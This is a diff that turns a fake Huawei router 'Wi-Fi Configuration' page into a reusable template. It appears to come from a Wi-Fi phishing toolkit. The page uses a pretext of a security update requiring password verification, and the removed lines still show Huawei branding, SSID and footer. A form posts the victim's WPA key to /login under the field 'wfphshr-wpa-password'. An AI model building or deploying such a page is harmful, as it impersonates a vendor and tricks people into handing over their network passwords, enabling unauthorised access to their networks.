@@ -1,40 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>HUAWEI — Wi-Fi Configuration</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{page_title}}</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;}
-        .header{background:#cf0a2c;padding:14px 24px;display:flex;align-items:center;}
-        .header h1{color:#fff;font-size:20px;font-weight:300;letter-spacing:2px;}
-        .container{max-width:600px;margin:24px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);}
-        .nav{background:#fff;padding:0 16px;border-bottom:1px solid #eee;display:flex;gap:0;}
-        .nav a{padding:12px 16px;font-size:13px;color:#333;text-decoration:none;border-bottom:3px solid transparent;}
-        .nav a.active{color:#cf0a2c;border-bottom-color:#cf0a2c;font-weight:600;}
-        .body{padding:24px;}
-        .info-box{background:#fef3e0;border-radius:6px;padding:14px;margin-bottom:20px;font-size:13px;color:#795548;}
-        .row{display:flex;align-items:center;margin-bottom:14px;}
-        .row label{width:40%;font-size:13px;color:#666;}
-        .row input,.row select{flex:1;padding:8px;border:1px solid #ddd;border-radius:4px;font-size:13px;}
-        .btn{margin-top:8px;padding:10px 32px;background:#cf0a2c;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;}
-        .btn:hover{background:#e01040;}
-        .footer{text-align:center;padding:12px;font-size:10px;color:#aaa;}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; }
+        .header { background: #cf0a2c; padding: 14px 24px; display: flex; align-items: center; }
+        .header h1 { color: #fff; font-size: 20px; font-weight: 300; letter-spacing: 2px; }
+        .container { max-width: 600px; margin: 24px auto; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+        .nav { background: #fff; padding: 0 16px; border-bottom: 1px solid #eee; display: flex; gap: 0; }
+        .nav a { padding: 12px 16px; font-size: 13px; color: #333; text-decoration: none; border-bottom: 3px solid transparent; }
+        .nav a.active { color: #cf0a2c; border-bottom-color: #cf0a2c; font-weight: 600; }
+        .body { padding: 24px; }
+        .info-box { background: #fef3e0; border-radius: 6px; padding: 14px; margin-bottom: 20px; font-size: 13px; color: #795548; }
+        .row { display: flex; align-items: center; margin-bottom: 14px; }
+        .row label { width: 40%; font-size: 13px; color: #666; }
+        .row input, .row select { flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-size: 13px; }
+        .btn { margin-top: 8px; padding: 10px 32px; background: #cf0a2c; color: #fff; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; }
+        .btn:hover { background: #e01040; }
+        .footer { text-align: center; padding: 12px; font-size: 10px; color: #aaa; }
     </style>
 </head>
 <body>
-    <div class="header"><h1>HUAWEI</h1></div>
+    <div class="header"><h1>{{brand}}</h1></div>
     <div class="container">
-        <div class="nav"><a href="#">Home</a><a href="#" class="active">Wi-Fi</a><a href="#">Network</a></div>
+        <div class="nav"><a href="#">{{nav_home}}</a><a href="#" class="active">{{nav_wifi}}</a><a href="#">{{nav_network}}</a></div>
         <div class="body">
-            <div class="info-box">A security update requires verification of your Wi-Fi password.</div>
+            <div class="info-box">{{info_message}}</div>
             <form method="POST" action="/login">
-                <div class="row"><label>SSID</label><input type="text" value="HUAWEI-5G" disabled></div>
-                <div class="row"><label>Security</label><select disabled><option>WPA2-PSK</option></select></div>
-                <div class="row"><label>Wi-Fi Key</label><input type="password" name="wfphshr-wpa-password" placeholder="Enter Wi-Fi password" required></div>
-                <button type="submit" class="btn">Save</button>
+                <div class="row"><label>{{ssid_label}}</label><input type="text" value="{{ssid_value}}" disabled></div>
+                <div class="row"><label>{{security_label}}</label><select disabled><option>{{security_option}}</option></select></div>
+                <div class="row"><label>{{wifi_key_label}}</label><input type="password" name="wfphshr-wpa-password" placeholder="{{password_placeholder}}" required></div>
+                <button type="submit" class="btn">{{submit_button}}</button>
             </form>
         </div>
-        <div class="footer">Huawei Technologies Co., Ltd.</div>
+        <div class="footer">{{footer}}</div>
     </div>
 </body>
 </html>
